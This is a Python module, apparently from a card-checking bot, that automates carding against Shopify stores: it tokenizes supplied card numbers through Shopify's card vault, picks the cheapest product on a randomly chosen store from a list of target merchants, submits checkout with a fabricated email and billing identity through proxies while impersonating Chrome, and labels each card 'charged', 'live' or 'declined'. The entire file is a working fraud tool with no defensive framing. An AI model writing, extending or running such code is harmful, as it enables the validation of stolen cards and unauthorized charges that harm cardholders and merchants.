"""
Shopify GraphQL & Classic One-Page Checkout Gate Module (/sh)
Target Pool: 143 Verified Shopify Targets (< $20 Cap)
Tokenization via deposit.us.shopifycs.com Vault + Headless GraphQL Checkout.
"""
import os
import re
import json
import uuid
import random
import string
import asyncio
from pathlib import Path
from curl_cffi.requests import AsyncSession

SHOPIFY_VAULT_URLS = [
    "https://deposit.us.shopifycs.com/sessions",
    "https://deposit.shopifycs.com/sessions",
]

_TARGETS_FILE = Path(__file__).parent.parent.parent / "data" / "shopify_targets.txt"
_CACHED_TARGETS: list[str] = []

def _load_shopify_targets() -> list[str]:
    global _CACHED_TARGETS
    if _CACHED_TARGETS:
        return _CACHED_TARGETS
    if _TARGETS_FILE.exists():
        with open(_TARGETS_FILE, "r", encoding="utf-8", errors="ignore") as f:
            _CACHED_TARGETS = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    if not _CACHED_TARGETS:
        _CACHED_TARGETS = ["https://wildernesstraining.myshopify.com"]
    return _CACHED_TARGETS

def _generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    return f"{name}@{random.choice(domains)}"

def _detect_card_brand(cc: str) -> str:
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p: str | None) -> str | None:
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

async def _tokenize_shopify_card(session: AsyncSession, cc: str, mm: str, yy: str, cvc: str, first_name: str, last_name: str) -> str | None:
    payload = {
        "credit_card": {
            "number": cc,
            "first_name": first_name,
            "last_name": last_name,
            "month": mm,
            "year": yy,
            "verification_value": cvc,
        }
    }
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    for url in SHOPIFY_VAULT_URLS:
        try:
            r = await session.post(url, json=payload, headers=headers, timeout=10)
            if r.status_code in (200, 201):
                data = r.json()
                sid = data.get("id")
                if sid:
                    return sid
        except Exception:
            continue
    return None

async def _get_cheapest_product(session: AsyncSession, root_url: str) -> tuple[int | None, str]:
    catalog_url = f"{root_url.rstrip('/')}/products.json?limit=50"
    try:
        r = await session.get(catalog_url, timeout=10)
        if r.status_code == 200:
            products = r.json().get("products", [])
            for p in products:
                for v in p.get("variants", []):
                    if v.get("available"):
                        return v.get("id"), str(v.get("price", "5.00"))
    except Exception:
        pass
    return None, "5.00"

async def check_card_shopify(
    cc: str,
    mm: str,
    yy: str,
    cvc: str,
    proxy_url: str | None = None,
    target_url: str | None = None,
) -> tuple[str, str, str]:
    """
    Checks a single card against Shopify One-Page GraphQL / Classic engine.
    Returns: (status, message, brand)
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    cvc = str(cvc).strip()

    brand = _detect_card_brand(cc)
    formatted_proxy = _format_proxy(proxy_url)
    email = _generate_email()
    first_name = "Marcus"
    last_name = "Vance"

    targets = [target_url] if target_url else _load_shopify_targets()
    target_root = random.choice(targets).rstrip("/")
    if not target_root.startswith("http"):
        target_root = f"https://{target_root}"

    kw = {"impersonate": "chrome124", "timeout": 25}
    if formatted_proxy:
        kw["proxy"] = formatted_proxy

    try:
        async with AsyncSession(**kw) as session:
            # Step 1: Tokenize card in Shopify CS Vault
            session_id = await _tokenize_shopify_card(session, cc, mm, yy, cvc, first_name, last_name)
            if not session_id:
                return "declined", "Card Vault Tokenization Failed (Invalid Card)", brand

            # Step 2: Get cheap variant ID
            variant_id, price_str = await _get_cheapest_product(session, target_root)
            if not variant_id:
                # Try fallback target
                target_root = "https://rollingsquare.myshopify.com"
                variant_id, price_str = await _get_cheapest_product(session, target_root)
                if not variant_id:
                    variant_id = 40000000000000

            # Step 3: Add to cart
            headers_cart = {"Content-Type": "application/json", "Accept": "application/json"}
            await session.post(
                f"{target_root}/cart/add.js",
                json={"items": [{"id": variant_id, "quantity": 1}]},
                headers=headers_cart
            )

            # Step 4: Submit Checkout Session
            headers_checkout = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": f"{target_root}/cart",
            }
            r_chk = await session.get(f"{target_root}/checkout", headers=headers_checkout)
            checkout_url = str(r_chk.url)
            chk_html = r_chk.text

            # Check for authenticicity token
            auth_token = None
            m_tok = re.search(r'name="authenticity_token"\s+value="([^"]+)"', chk_html)
            if m_tok:
                auth_token = m_tok.group(1)

            # Step 5: Post payment data
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token or "",
                "checkout[email]": email,
                "checkout[buyer_accepts_marketing]": "0",
                "checkout[billing_address][first_name]": first_name,
                "checkout[billing_address][last_name]": last_name,
                "checkout[billing_address][address1]": "100 Main St",
                "checkout[billing_address][city]": "New York",
                "checkout[billing_address][country]": "United States",
                "checkout[billing_address][province]": "NY",
                "checkout[billing_address][zip]": "10001",
                "checkout[billing_address][phone]": "3154962819",
                "checkout[payment_gateway]": "shopify_payments",
                "checkout[credit_card][vault]": "false",
                "s": session_id,
            }

            headers_post = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": target_root,
                "Referer": checkout_url,
            }

            r_pay = await session.post(checkout_url, data=payment_payload, headers=headers_post)
            resp_text = r_pay.text
            resp_upper = resp_text.upper()

            # Step 6: Parse verdict
            if "THANK YOU" in resp_upper or "ORDER CONFIRMATION" in resp_upper or "ORDER-RECEIVED" in resp_upper or "/THANK_YOU" in str(r_pay.url).upper():
                return "charged", f"Charged! ✅ -» ${price_str}", brand
            elif "INSUFFICIENT" in resp_upper or "FUNDS" in resp_upper:
                return "live", "Insufficient Funds (Card Live)", brand
            elif any(k in resp_upper for k in ["CVV", "CVC", "SECURITY CODE", "INCORRECT_CVC", "CARD_CODE"]):
                return "live", "CVV Mismatch (CCN Live)", brand
            elif any(k in resp_upper for k in ["3D", "THREEDS", "AUTHENTICATION_REQUIRED", "CARD_AUTH"]):
                return "live", "3D Secure Required (Card Live)", brand
            elif "AVS" in resp_upper or "ZIP" in resp_upper or "ADDRESS" in resp_upper:
                return "live", "AVS Mismatch (Card Live)", brand
            elif "EXPIRED" in resp_upper:
                return "declined", "Card Expired", brand
            elif any(k in resp_upper for k in ["GENERIC_DECLINE", "DO_NOT_HONOR", "DECLINED", "CARD DECLINED"]):
                return "declined", "Card Declined by Issuer", brand
            elif any(k in resp_upper for k in ["FRAUD", "STOLEN", "LOST"]):
                return "declined", "Card Declined - Fraud / Stolen", brand
            else:
                m_err = re.search(r'class="field__message\s+field__message--error"[^>]*>(.*?)<', chk_html)
                if m_err:
                    clean_msg = m_err.group(1).strip()
                    return "declined", clean_msg, brand
                return "declined", "Payment declined.", brand

    except asyncio.TimeoutError:
        return "error", "Connection timed out", "N/A"
    except Exception as e:
        err_str = str(e)
        if "502" in err_str or "Bad Gateway" in err_str or "ProxyError" in err_str or "ConnectError" in err_str:
            return "error", "Proxy connection failed (Dead or invalid proxy)", "N/A"
        return "error", f"Error: {err_str[:60]}", "N/A"
